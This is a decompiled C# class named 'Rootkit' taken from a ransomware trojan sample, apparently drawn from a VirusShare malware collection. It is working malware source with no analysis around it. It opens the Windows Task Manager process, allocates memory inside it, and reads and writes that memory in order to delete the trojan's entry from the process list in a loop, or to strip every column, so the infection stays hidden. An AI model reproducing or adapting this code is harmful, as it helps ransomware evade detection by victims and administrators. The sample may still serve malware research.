// Decompiled with JetBrains decompiler
// Type: n3ux.Rootkit
// Assembly: flu-nucleo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 807F4FF6-398F-45B5-8EC1-50AF57383C19
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.avxv-c9e0300c4b5a251c76c291f23c0d27537f89d4b9.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace n3ux
{
  internal class Rootkit
  {
    private const int PROCESS_VM_OPERATION = 8;
    private const int PROCESS_VM_READ = 16;
    private const int PROCESS_VM_WRITE = 32;
    private const int PROCESS_ALL_ACCESS = 0;
    private const int MEM_COMMIT = 4096;
    private const int MEM_RESERVE = 8192;
    private const int MEM_DECOMMIT = 16384;
    private const int MEM_RELEASE = 32768;
    private const int MEM_FREE = 65536;
    private const int MEM_PRIVATE = 131072;
    private const int MEM_MAPPED = 262144;
    private const int MEM_TOP_DOWN = 1048576;
    private const int PAGE_NOACCESS = 1;
    private const int PAGE_READONLY = 2;
    private const int PAGE_READWRITE = 4;
    private const int PAGE_WRITECOPY = 8;
    private const int PAGE_EXECUTE = 16;
    private const int PAGE_EXECUTE_READ = 32;
    private const int PAGE_EXECUTE_READWRITE = 64;
    private const int PAGE_EXECUTE_WRITECOPY = 128;
    private const int PAGE_GUARD = 256;
    private const int PAGE_NOCACHE = 512;
    private const int LVM_FIRST = 4096;
    private const int LVM_GETITEMCOUNT = 4100;
    private const int LVM_DELETEITEM = 4104;
    private const int LVM_GETITEMTEXTA = 4141;
    private const int LVM_SETITEMTEXTA = 4142;
    private const int LVM_DELETECOLUMN = 4124;
    private static volatile bool endWorker = false;
    public static volatile bool hideOnlyTrojan = true;

    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenProcess(
      int dwDesiredAccess,
      bool bInheritHandle,
      uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(
      IntPtr hProcess,
      IntPtr lpAddress,
      uint dwSize,
      int flAllocationType,
      int flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualFreeEx(
      IntPtr hProcess,
      IntPtr lpAddress,
      uint dwSize,
      int dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(
      IntPtr hProcess,
      IntPtr lpBaseAddress,
      byte[] lpBuffer,
      uint nSize,
      out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(
      IntPtr hProcess,
      IntPtr lpBaseAddress,
      [Out] byte[] lpBuffer,
      int dwSize,
      out UIntPtr lpNumberOfBytesRead);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern IntPtr SendMessage(
      IntPtr hWnd,
      uint Msg,
      IntPtr wParam,
      IntPtr lParam);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindowEx(
      IntPtr parentHandle,
      IntPtr childAfter,
      string className,
      string windowTitle);

    private static byte[] StructureToByteArray(object obj)
    {
      int length = Marshal.SizeOf(obj);
      byte[] destination = new byte[length];
      IntPtr num = Marshal.AllocHGlobal(length);
      Marshal.StructureToPtr(obj, num, true);
      Marshal.Copy(num, destination, 0, length);
      Marshal.FreeHGlobal(num);
      return destination;
    }

    private static IntPtr OpenProcessHandle(uint pid) => Rootkit.OpenProcess(56, false, pid);

    private static void CloseProcessHandle(IntPtr hProcess) => Rootkit.CloseHandle(hProcess);

    private static IntPtr AllocExternalMemory(uint memSize, IntPtr hProcess) => Rootkit.VirtualAllocEx(hProcess, IntPtr.Zero, memSize, 12288, 4);

    private static void FreeExternalMemory(IntPtr hProcess, IntPtr MemAddress, uint memSize) => Rootkit.VirtualFreeEx(hProcess, MemAddress, memSize, 32768);

    private static IntPtr FindTaskManager()
    {
      IntPtr window = Rootkit.FindWindow("#32770", "Administrador de tareas de Windows");
      return !(window == IntPtr.Zero) ? Rootkit.FindWindowEx(Rootkit.FindWindowEx(window, IntPtr.Zero, "#32770", (string) null), IntPtr.Zero, "SysListView32", "Procesos") : Rootkit.FindWindowEx(Rootkit.FindWindowEx(Rootkit.FindWindow("#32770", "Windows Task Manager"), IntPtr.Zero, "#32770", (string) null), IntPtr.Zero, "SysListView32", "Processes");
    }

    private static IntPtr GetItemCount(IntPtr handle) => Rootkit.SendMessage(handle, 4100U, IntPtr.Zero, IntPtr.Zero);

    private static void DeleteItem(IntPtr handle, IntPtr index) => Rootkit.SendMessage(handle, 4104U, index, IntPtr.Zero);

    private static void DeleteColumn(IntPtr handle) => Rootkit.SendMessage(handle, 4124U, IntPtr.Zero, IntPtr.Zero);

    private static string GetItemText(IntPtr handle, IntPtr index)
    {
      byte[] numArray = new byte[50];
      Rootkit.LVITEM structure = new Rootkit.LVITEM();
      uint lpdwProcessId;
      int windowThreadProcessId = (int) Rootkit.GetWindowThreadProcessId(handle, out lpdwProcessId);
      IntPtr hProcess = Rootkit.OpenProcessHandle(lpdwProcessId);
      IntPtr num1 = Rootkit.AllocExternalMemory((uint) Marshal.SizeOf((object) structure), hProcess);
      IntPtr num2 = Rootkit.AllocExternalMemory(50U, hProcess);
      structure.iItem = index;
      structure.iSubItem = (IntPtr) 0;
      structure.cchTextMax = 50U;
      structure.pszText = num2;
      UIntPtr num3;
      Rootkit.WriteProcessMemory(hProcess, num1, Rootkit.StructureToByteArray((object) structure), (uint) Marshal.SizeOf((object) structure), out num3);
      Rootkit.SendMessage(handle, 4141U, index, num1);
      Rootkit.ReadProcessMemory(hProcess, num2, numArray, 50, out num3);
      Rootkit.FreeExternalMemory(hProcess, num1, (uint) Marshal.SizeOf((object) structure));
      Rootkit.FreeExternalMemory(hProcess, num2, 50U);
      Rootkit.CloseProcessHandle(hProcess);
      return Encoding.ASCII.GetString(numArray);
    }

    private static void HideProcess(string process)
    {
      IntPtr taskManager = Rootkit.FindTaskManager();
      if (!(taskManager != IntPtr.Zero))
        return;
      int itemCount = (int) Rootkit.GetItemCount(taskManager);
      for (int index = 0; index < itemCount; ++index)
      {
        if (Rootkit.GetItemText(taskManager, (IntPtr) index).Contains(process))
          Rootkit.DeleteItem(taskManager, (IntPtr) index);
      }
    }

    private static void HideAllProcesses()
    {
      IntPtr taskManager = Rootkit.FindTaskManager();
      if (!(taskManager != IntPtr.Zero))
        return;
      Rootkit.DeleteColumn(taskManager);
      Rootkit.DeleteColumn(taskManager);
      Rootkit.DeleteColumn(taskManager);
      Rootkit.DeleteColumn(taskManager);
      Rootkit.DeleteColumn(taskManager);
    }

    public static void Hide() => new Thread(new ThreadStart(Rootkit.Worker)).Start();

    public static void StopHiding() => Rootkit.endWorker = true;

    private static void Worker()
    {
      while (!Rootkit.endWorker)
      {
        if (Rootkit.hideOnlyTrojan)
        {
          Rootkit.HideProcess(Process.GetCurrentProcess().ProcessName + ".exe");
          Thread.Sleep(525);
        }
        else
        {
          Rootkit.HideAllProcesses();
          Thread.Sleep(1000);
        }
      }
      Rootkit.endWorker = false;
    }

    private struct LVITEM
    {
      public uint mask;
      public IntPtr iItem;
      public IntPtr iSubItem;
      public uint state;
      public uint stateMask;
      public IntPtr pszText;
      public uint cchTextMax;
      public int iImage;
      public IntPtr lParam;
    }
  }
}
